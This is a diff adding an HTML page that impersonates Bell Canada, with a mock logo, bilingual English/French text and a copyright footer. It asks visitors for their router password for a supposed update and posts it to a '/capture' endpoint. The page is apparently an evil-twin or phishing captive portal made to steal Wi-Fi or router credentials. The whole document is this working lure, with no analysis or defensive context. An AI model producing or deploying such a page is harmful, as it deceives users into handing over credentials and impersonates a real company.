@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bell Canada Update / Mise à jour Bell Canada</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+        }
+        .logo {
+            width: 300px; /* Agrandi de 250px à 300px */
+            margin: 0 auto 25px auto; /* Centré horizontalement */
+            display: block;
+        }
+        h1 {
+            font-size: 26px;
+            color: #003087; /* Bleu Bell */
+            margin-bottom: 15px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        input[type="submit"] {
+            background-color: #003087; /* Bleu Bell */
+            color: #fff;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        input[type="submit"]:hover {
+            background-color: #00215e; /* Bleu plus foncé */
+        }
+        .footer {
+            font-size: 12px;
+            color: #999;
+            margin-top: 25px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg class="logo" viewBox="0 0 300 50" xmlns="http://www.w3.org/2000/svg">
+            <!-- Texte "Bell" centré -->
+            <text x="50%" y="40" font-size="50" font-family="Arial" font-weight="bold" fill="#003087" text-anchor="middle">Bell</text>
+        </svg>
+        <h1>Router Update / Mise à jour de votre router</h1>
+        <p>Please enter your router password to proceed with the Bell update.<br>Veuillez entrer le mot de passe de votre router Bell pour procéder à la mise à jour.</p>
+        <form action="/capture" method="POST">
+            <input type="password" name="password" placeholder="Router Password / Mot de passe de votre router" required>
+            <input type="submit" value="Login / Connexion">
+        </form>
+        <div class="footer">
+            © 2025 Bell Canada. All rights reserved. / Tous droits réservés.
+        </div>
+    </div>
+</body>
+</html>
